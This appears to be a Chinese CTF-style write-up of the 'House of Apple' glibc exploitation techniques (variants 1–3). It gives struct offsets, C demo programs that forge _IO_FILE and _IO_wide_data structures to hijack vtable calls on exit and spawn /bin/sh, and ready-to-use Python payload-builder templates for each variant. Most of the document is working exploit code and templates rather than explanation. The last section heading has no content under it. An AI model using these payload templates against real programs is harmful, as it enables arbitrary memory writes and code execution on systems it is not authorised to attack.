- [House of apple](#house-of-apple)
  - [基础结构体](#基础结构体)
  - [house of apple1](#house-of-apple1)
  - [house of apple2](#house-of-apple2)
  - [House of apple3](#house-of-apple3)
# House of apple

## 基础结构体

`_IO_wstrn_jumps`在IDA中找, 其中`_IO_wstr_underflow`调用的`_IO_wdefault_uflow`函数

```C
// vswprintf.c
const struct _IO_jump_t _IO_wstrn_jumps libio_vtable attribute_hidden =
    {
        JUMP_INIT_DUMMY,
        JUMP_INIT(finish, _IO_wstr_finish),
        JUMP_INIT(overflow, (_IO_overflow_t)_IO_wstrn_overflow),
        JUMP_INIT(underflow, (_IO_underflow_t)_IO_wstr_underflow),
        JUMP_INIT(uflow, (_IO_underflow_t)_IO_wdefault_uflow),
        JUMP_INIT(pbackfail, (_IO_pbackfail_t)_IO_wstr_pbackfail),
        JUMP_INIT(xsputn, _IO_wdefault_xsputn),
        JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
        JUMP_INIT(seekoff, _IO_wstr_seekoff),
        JUMP_INIT(seekpos, _IO_default_seekpos),
        JUMP_INIT(setbuf, _IO_default_setbuf),
        JUMP_INIT(sync, _IO_default_sync),
        JUMP_INIT(doallocate, _IO_wdefault_doallocate),
        JUMP_INIT(read, _IO_default_read),
        JUMP_INIT(write, _IO_default_write),
        JUMP_INIT(seek, _IO_default_seek),
        JUMP_INIT(close, _IO_default_close),
        JUMP_INIT(stat, _IO_default_stat),
        JUMP_INIT(showmanyc, _IO_default_showmanyc),
        JUMP_INIT(imbue, _IO_default_imbue)};

// gconv.h
struct __gconv_step // size = 0x68
{
    struct __gconv_loaded_object *__shlib_handle; // 偏移:0x0  大小:0x8
    const char *__modname;                        // 偏移:0x8  大小:0x8

    int __counter; // 偏移:0x10  大小:0x4

    char *__from_name; // 偏移:0x18  大小:0x8
    char *__to_name;   // 偏移:0x20  大小:0x8

    __gconv_fct __fct;             // 偏移:0x28  大小:0x8
    __gconv_btowc_fct __btowc_fct; // 偏移:0x30  大小:0x8
    __gconv_init_fct __init_fct;   // 偏移:0x38  大小:0x8
    __gconv_end_fct __end_fct;     // 偏移:0x40  大小:0x8

    int __min_needed_from; // 偏移:0x48  大小:0x4
    int __max_needed_from; // 偏移:0x4C  大小:0x4
    int __min_needed_to;   // 偏移:0x50  大小:0x4
    int __max_needed_to;   // 偏移:0x54  大小:0x4

    int __stateful; // 偏移:0x58  大小:0x4

    void *__data; // 偏移:0x60  大小:0x8
};

// gconv.h
struct __gconv_step_data // size = 0x30
{
    unsigned char *__outbuf;    // 偏移:0x0  大小:0x8
    unsigned char *__outbufend; // 偏移:0x8  大小:0x8

    int __flags; // 偏移:0x10  大小:0x4

    int __invocation_counter; // 偏移:0x14  大小:0x4

    int __internal_use; // 偏移:0x18  大小:0x4

    __mbstate_t *__statep; // 偏移:0x20  大小:0x8
    __mbstate_t __state;   // 偏移:0x28  大小:0x8
};

// libio.h
typedef struct // size = 0x38
{
    struct __gconv_step *step;          // 大小:0x8
    struct __gconv_step_data step_data; // 大小:0x30
} _IO_iconv_t;

// libio.h
struct _IO_codecvt // size = 0x70
{
    _IO_iconv_t __cd_in;  // 大小:0x38
    _IO_iconv_t __cd_out; // 大小:0x38
};

// libio.h
struct _IO_wide_data // size = 0xE8
{
    wchar_t *_IO_read_ptr;   // 偏移:0x0  大小:0x8
    wchar_t *_IO_read_end;   // 偏移:0x8  大小:0x8
    wchar_t *_IO_read_base;  // 偏移:0x10  大小:0x8
    wchar_t *_IO_write_base; // 偏移:0x18  大小:0x8
    wchar_t *_IO_write_ptr;  // 偏移:0x20  大小:0x8
    wchar_t *_IO_write_end;  // 偏移:0x28  大小:0x8
    wchar_t *_IO_buf_base;   // 偏移:0x30  大小:0x8
    wchar_t *_IO_buf_end;    // 偏移:0x38  大小:0x8

    wchar_t *_IO_save_base;   // 偏移:0x40  大小:0x8
    wchar_t *_IO_backup_base; // 偏移:0x48  大小:0x8
    wchar_t *_IO_save_end;    // 偏移:0x50  大小:0x8

    __mbstate_t _IO_state;       // 偏移:0x58  大小:0x8
    __mbstate_t _IO_last_state;  // 偏移:0x60  大小:0x8
    struct _IO_codecvt _codecvt; // 偏移:0x68  大小:0x70

    wchar_t _shortbuf[1]; // 偏移:0xD8  大小:0x4

    const struct _IO_jump_t *_wide_vtable; // 偏移:0xE0  大小:0x8
};

// strfile.h
typedef struct
{
    _IO_strfile f;  // size = 0xF0
    wchar_t overflow_buf[64];
} _IO_wstrnfile;
```

`struct _IO_wide_data *_wide_data`在`_IO_FILE`中的偏移如下:

```C
struct _IO_wide_data *_wide_data; // 偏移量:0xA0 大小:0x8 *size = 0xE8
```

## house of apple1

__利用版本:__

__危害:__

可以修改任意地址为`fake_IO_file + 0xF0`

__原理:__

利用`_IO_wstrn_overflow`对`_IO_FILE`中的`_wide_data`指向的地址复制来进行写

__攻击:__

1. 设置 `fake_IO_FILE` 的 `fp->_mode = 0`
2. 设置 `fake_IO_FILE` 的 `fp->_IO_write_ptr = 1` 
3. 设置 `fake_IO_FILE` 的 `fp->_IO_write_base = 0`
4. 设置 `fake_IO_FILE` 的 `fp->_flags2 = 8`
5. 设置 `fake_IO_FILE` 的 `fp->_wide_data = 指向要写入的地址`
6. 设置 `fake_IO_FILE` 的 `fp->vtable = _IO_wstrn_jumps`
7. 设置`(_IO_wstrnfile*)fp->overflow_buf = 写入的地址的值`
8. 将`fake_IO_FILE`链入后通过`exit`触发`__overflow`即可

其中`target`将会指向`fake_IO_FILE + 0xF0`, 其他赋值如下:

```C
fp->_flags2 |= _IO_FLAGS2_USER_WBUF;
fp->_wide_data->_IO_read_ptr = snf->overflow_buf;       // 偏移0x0，主要修改这个值
fp->_wide_data->_IO_read_end = snf->overflow_buf + 64;  // 偏移0x8
fp->_wide_data->_IO_read_base = snf->overflow_buf;      // 偏移0x10
fp->_wide_data->_IO_write_base = snf->overflow_buf;     // 偏移0x18
fp->_wide_data->_IO_write_ptr = snf->overflow_buf;      // 偏移0x20
fp->_wide_data->_IO_write_end = snf->overflow_buf;      // 偏移0x28
fp->_wide_data->_IO_buf_base = snf->overflow_buf;       // 偏移0x30
fp->_wide_data->_IO_buf_end = snf->overflow_buf + 64;   // 偏移0x38
```

__示例:__

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>
#include <stdint.h>
#include <string.h>

int main()
{
    u64 jumps = GET_VALUE(stdin) - (0x21AAA0 - 0x216DC0);
    u64 target[0x100];

    u64 fake_IO_FILE = MALLOC(0x200);

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0); // fp->_mode = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, 1); // fp->_IO_write_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0); // fp->_IO_write_base = 0

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x68, 0);      // chain = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x74, 8);      // fp->_flags2 = 8
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xA0, target); // fp->_wide_data = target
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, jumps);  // fp->vtable = _IO_wstrn_jumps
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xF0, BINSH);  // (_IO_wstrnfile*)fp->overflow_buf = 写入的地址的值

    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // stdout->chain = fake_IO_FILE

    // 触发漏洞
    fcloseall();
    printf("target: %p\n", GET_ADDR_VALUE(target));
    printf("target: %s\n", GET_ADDR_VALUE(target));

    return 0; // 触发漏洞
}
```

__攻击模板:__

```python
def HOA1(wstrn_jumps_addr, target, value, chain = 0):
    '''
        修改target指向的地址的值为value, 这个地址是fake_IO_FILE+0xF0
        wstrn_jumps_addr: _IO_wstrn_jumps地址
        chain: 下一个链的地址, 默认为0
    '''
    payload = b''
    
    payload = set_value(payload, 0xC0, 0)                   # fp->_mode = 0
    payload = set_value(payload, 0x20, 0)                   # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1)                   # fp->_IO_write_ptr = 1

    payload = set_value(payload, 0x68, chain)               # chain

    payload = set_value(payload, 0x74, 0x8)                 # fp->_flags2 = 8
    payload = set_value(payload, 0xA0, target)              # fp->_wide_data = target
    payload = set_value(payload, 0xD8, wstrn_jumps_addr)    # fp->vtable = _IO_wstrn_jumps
    payload = set_value(payload, 0xF0, value)               # (_IO_wstrnfile*)fp->overflow_buf = 写入的地址的值
    
    return payload
```

## house of apple2

__危害:__

get shell

__原理:__

没有检查`_wide_vtable`地址的合法性

__攻击:__

设置`vtable`到`_IO_wfile_jumps`, `exit`触发`overflow`时进入`_IO_wfile_overflow`触发漏洞

设置`vtable`到`_IO_wfile_jumps + 0x8`, `exit`触发`overflow`时进入`_IO_wfile_underflow`触发漏洞

__示例:__

```C
// 设置`vtable`到`_IO_wfile_jumps`, `exit`触发`overflow`时进入`_IO_wfile_overflow`触发漏洞
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>
#include <stdint.h>
#include <string.h>

void backdoor()
{
    system("/bin/sh");
}

int main()
{
    u64 jumps = GET_VALUE(stdin) - (0x21AAA0 - 0x2170C0);

    u64 fake_IO_FILE = MALLOC(0x200);

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x0, 0);                       // fp->_flags = 0 || fp->_flags = value ^ (0x0008 | 0x0800 | 0x0002)
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0);                      // fp->_IO_write_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, 1);                      // fp->_IO_write_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x38, 1);                      // fp->_IO_buf_base = 1
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_IO_FILE, 0xA0, fake_IO_FILE, 0); // fp->_wide_data = fake_wide_data
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);                      // fp->_mode = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, jumps);                  // fp->vtable = _IO_wfile_jumps

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0 + 0x18, 0);                                  // fake_wide_data->_IO_write_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0 + 0x30, 0);                                  // fake_wide_data->_IO_buf_base = 0
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_IO_FILE, 0 + 0xE0, fake_IO_FILE, 0x40 - 13 * 8); // fake_wide_data->_wide_vtable = backdoor - 13*0x8
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x40, backdoor);                               // backdoor

    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // stdout->chain = fake_IO_FILE
    // 触发漏洞
    exit(0);

    return 0;
}
```

```C
// 设置`vtable`到`_IO_wfile_jumps + 0x8`, `exit`触发`overflow`时进入`_IO_wfile_underflow`触发漏洞
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>
#include <stdint.h>
#include <string.h>

void backdoor()
{
    system("/bin/sh");
}

int main()
{
    u64 jumps = GET_VALUE(stdin) - (0x21AAA0 - 0x2170C0);

    u64 fake_IO_FILE = MALLOC(0x200);

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x0, 0);                          // fp->_flags = 0 或者 fp->_flags = value ^ (0x10 | 0x04 | 0x02)
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x8, 1);                          // fp->_IO_read_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x10, 0);                         // fp->_IO_read_end = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0);                         // fp->_IO_write_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, 1);                         // fp->_IO_write_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x38, 1);                         // fp->_IO_buf_base = 1
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_IO_FILE, 0xA0, fake_IO_FILE, 0x18); // fp->_wide_data = fake_wide_data
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);                         // fp->_mode = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, jumps + 8);                 // fp->vtable = _IO_wfile_jumps + 8

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x18 + 0x0, 1);                                   // fake_wide_data->_IO_read_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x18 + 0x8, 0);                                   // fake_wide_data->_IO_read_end = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x18 + 0x30, 0);                                  // fake_wide_data->_IO_buf_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x18 + 0x40, 0);                                  // fake_wide_data->_IO_save_base = 0
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_IO_FILE, 0x18 + 0xE0, fake_IO_FILE, 0x40 - 13 * 8); // fake_wide_data->_wide_vtable = backdoor - 13 * 0x8
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x40, backdoor);                                  // backdoor

    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // stdout->chain = fake_IO_FILE
    // 触发漏洞
    exit(0);

    return 0;
}
```

__模板:__

```python
def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b'  /bin/sh\x00'):
    '''
        House of apple 2的overflow攻击链
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param: 函数传入的指针的值, 默认/bin/sh
    '''    
    payload = b''
    payload = set_value(payload, 0x0, 0);                                   # fp->_flags = 0 || fp->_flags = value ^ (0x0008 | 0x0800 | 0x0002)
    payload = set_value(payload, 0x20, 0);                                  # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                                  # fp->_IO_write_ptr = 1
    payload = set_value(payload, 0x38, 1);                                  # fp->_IO_buf_base = 1
    payload = set_value(payload, 0xA0, payload_addr);                       # fp->_wide_data = fake_wide_data
    payload = set_value(payload, 0xC0, 0);                                  # fp->_mode = 0
    payload = set_value(payload, 0xD8, _IO_wfile_jumps);                    # fp->vtable = _IO_wfile_jumps

    payload = set_value(payload, 0 + 0x18, 0);                              # fake_wide_data->_IO_write_base = 0
    payload = set_value(payload, 0 + 0x30, 0);                              # fake_wide_data->_IO_buf_base = 0
    payload = set_value(payload, 0 + 0xE0, payload_addr + 0x40 - 13 * 8);   # fake_wide_data->_wide_vtable = backdoor - 13*0x8
    payload = set_value(payload, 0x40, fun);                                # backdoor
    
    payload = param + payload[len(param):]
    return payload

def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b'  $0\x00'):
    '''
        House of apple 2的underflow攻击链
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param: 函数传入的指针的值, 默认/bin/sh
    '''
    payload = b''
    payload = set_value(payload, 0x0, 0);                                       # fp->_flags = 0 或者 fp->_flags = value ^ (0x10 | 0x04 | 0x02)
    payload = set_value(payload, 0x8, 1);                                       # fp->_IO_read_ptr = 1
    payload = set_value(payload, 0x10, 0);                                      # fp->_IO_read_end = 0
    payload = set_value(payload, 0x20, 0);                                      # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                                      # fp->_IO_write_ptr = 1
    payload = set_value(payload, 0x38, 1);                                      # fp->_IO_buf_base = 1
    payload = set_value(payload, 0xA0, payload_addr + 0x18);                    # fp->_wide_data = fake_wide_data
    payload = set_value(payload, 0xC0, 0);                                      # fp->_mode = 0
    payload = set_value(payload, 0xD8, _IO_wfile_jumps + 8);                    # fp->vtable = _IO_wfile_jumps + 8

    payload = set_value(payload, 0x18 + 0x0, 1);                                # fake_wide_data->_IO_read_ptr = 1
    payload = set_value(payload, 0x18 + 0x8, 0);                                # fake_wide_data->_IO_read_end = 0
    payload = set_value(payload, 0x18 + 0x30, 0);                               # fake_wide_data->_IO_buf_base = 0
    payload = set_value(payload, 0x18 + 0x40, 0);                               # fake_wide_data->_IO_save_base = 0
    payload = set_value(payload, 0x18 + 0xE0, payload_addr + 0x40 - 13 * 8);    # fake_wide_data->_wide_vtable = backdoor - 13 * 0x8
    payload = set_value(payload, 0x40, fun);                                    # backdoor
    
    payload = param + payload[len(param):]
    return payload
```

## House of apple3

__危害:__

劫持程序执行流

__原理:__

利用_IO_FILE结构体中的`struct _IO_codecvt *_codecvt;     // 偏移量:0x98 大小:0x8`

__攻击:__

错位修改`vtable`到`_IO_wfile_jumps`, 触发`_IO_wfile_underflow`进入`__libio_codecvt_in`来触发函数指针

__示例:__

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>
#include <stdint.h>
#include <string.h>

void backdoor(u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6, u64 arg7, u64 arg8)
{
    PUT_VALUE("arg1 + 8", arg1 + 8);
    PUT_ADDR_VALUE("arg1 + 8", arg1 + 8);

    PUT_VALUE("arg2", arg2);
    PUT_ADDR_VALUE("arg2", arg2);

    PUT_VALUE("arg2 + 8", arg2 + 8);
    PUT_ADDR_VALUE("arg2 + 8", arg2 + 8);

    PUT_VALUE("arg2 + 0x10", arg2 + 0x10);
    PUT_ADDR_VALUE("arg2 + 0x10", arg2 + 0x10);

    PUT_VALUE("arg2 + 0x18", arg2 + 0x18);
    PUT_ADDR_VALUE("arg2 + 0x18", arg2 + 0x18);

    PUT_VALUE("arg3", arg3);
    PUT_ADDR_VALUE("arg3", arg3);

    PUT_VALUE("arg4", arg4);

    PUT_VALUE("arg5", arg5);

    PUT_VALUE("arg6", arg6);
    PUT_ADDR_VALUE("arg6", arg6);

    PUT_VALUE("arg5", arg7);

    PUT_VALUE("arg5", arg8);

    system("/bin/sh");
}

int main()
{
    u64 jumps = GET_VALUE(stdin) - (0x21AAA0 - 0x2170C0);
    u64 fake_IO_FILE = MALLOC(0x500);
    PUT_VALUE("fake_IO_FILE", fake_IO_FILE);
    dm_InitStd();

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x0, 0);                           // fp->_flags = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x8, 0x333);                       // fp->_IO_read_ptr : 第三个参数指向的地址的值
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x10, 0x444);                      // fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0);                          // fp->_IO_write_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, 1);                          // fp->_IO_write_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);                          // fp->_mode = 0
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_IO_FILE, 0xA0, fake_IO_FILE, 0xE0);  // fp->_wide_data = fake_wide_data
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_IO_FILE, 0x98, fake_IO_FILE, 0x148); // fp->_codecvt = fake_codecvt
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, jumps + 8);                  // fp->vtable = _IO_wfile_jumps + 0x8

    // fake_wide_data
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE0 + 0x0, 1); // fake_wide_data->_IO_read_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE0 + 0x8, 0); // fake_wide_data->_IO_read_end = 0
    // fake_wide_data->_IO_read_ptr    将会被设置 偏移为:0x0
    // fake_wide_data->_IO_read_base   将会被设置 偏移为:0x10
    // fake_wide_data->_IO_last_state  将会被设置 偏移为:0x60
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE0 + 0x30, 0x221); // 第二个参数指向的地址的值
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE0 + 0x38, 0x222); // 第二个参数指向的地址+8的值

    // fake_codecvt
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_IO_FILE, 0x148 + 0x0, fake_IO_FILE, 0x148 + 0x70); // fake_codecvt->__cd_in.step = fake_step
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x148 + 0x8 + 0x10, 0x223);                      // fake_codecvt->__cd_in.step_data + 0x10, 第二个参数指向的地址+0x10开始的值
    // ...
    // 注意:第二个参数地址+0x20指向的值不可控

    // fake_step
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x148 + 0x70 + 0x8, 0x111); // 第一个参数指向的地址+8的值，注:第一个参数指向的地址的值必须为0
    // ...

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x148 + 0x70 + 0x28, backdoor); // fake_step.__fct = fake_fct

    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // stdout->chain = fake_IO_FILE
    // 触发漏洞
    exit(0);

    return 0;
}
```

__模板:__

```python
def HOA3underflow(_IO_wfile_jumps, payload_addr, fun, param1_value_offset_8 = b'', param2_value = b'', param3_value = b'', param4 = 0xFFFFFFFFFFFFFFFF):
    '''
        HOA3的underflow攻击链
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param1_value_offset_8: 第一个参数指向的地址+8的值
        param2_value: 第二个参数指向的地址的值
        param3_value: 第三个参数指向的地址的值
        param4: 第四个参数
        
        注意 : 第四个参数的值要大于第三个参数的前三个字节的值
               第二个参数地址+0x20指向的值不可控
    '''
    if(u64(param3_value.ljust(8, b'\x00')[:8]) >= param4):
        raise Exception('第四个参数的值要大于第三个参数的前三个字节的值')
    
    payload = b''
    # 设置第一个参数
    payload = set_bytes(payload, 0x148 - 0x50 + 0x8, param1_value_offset_8)# 第一个参数指向的地址+8的值，注:第一个参数指向的地址的值必须为0
    # 设置第二个参数
    payload = set_bytes(payload, 0xE0 + 0x30, param2_value.ljust(0x10, b'\x00')[:0x10])
    if(len(param2_value) > 0x10):
        payload = set_bytes(payload, 0x148 + 0x8 + 0x10, param2_value[0x10:])
    # 设置第三个参数
    payload = set_bytes(payload, 0x8, param3_value)
    # 设置第四个参数
    payload = set_value(payload, 0x10, param4);                     # fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
    
    payload = set_value(payload, 0x0, 0);                           # fp->_flags = 0
    # payload = set_value(payload, 0x8, 0);                         # fp->_IO_read_ptr : 第三个参数指向的地址的值
    # payload = set_value(payload, 0x10, param4);                   # fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
    payload = set_value(payload, 0x20, 0);                          # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                          # fp->_IO_write_ptr = 1
    payload = set_value(payload, 0xC0, 0);                          # fp->_mode = 0
    payload = set_value(payload, 0xA0, payload_addr + 0xE0);        # fp->_wide_data = fake_wide_data
    payload = set_value(payload, 0x98, payload_addr + 0x148);       # fp->_codecvt = fake_codecvt
    payload = set_value(payload, 0xD8, _IO_wfile_jumps + 8);        # fp->vtable = _IO_wfile_jumps + 0x8
    # fake_wide_data
    payload = set_value(payload, 0xE0 + 0x0, 1); # fake_wide_data->_IO_read_ptr = 1
    payload = set_value(payload, 0xE0 + 0x8, 0); # fake_wide_data->_IO_read_end = 0
    # fake_codecvt
    payload = set_value(payload, 0x148 + 0x0, payload_addr + 0x148 - 0x50); # fake_codecvt->__cd_in.step = fake_step
    # fake_step
    payload = set_value(payload, 0x148 - 0x50 + 0x28, fun); # fake_step.__fct = fake_fct
    
    return payload
```

## House of apple3 (通杀)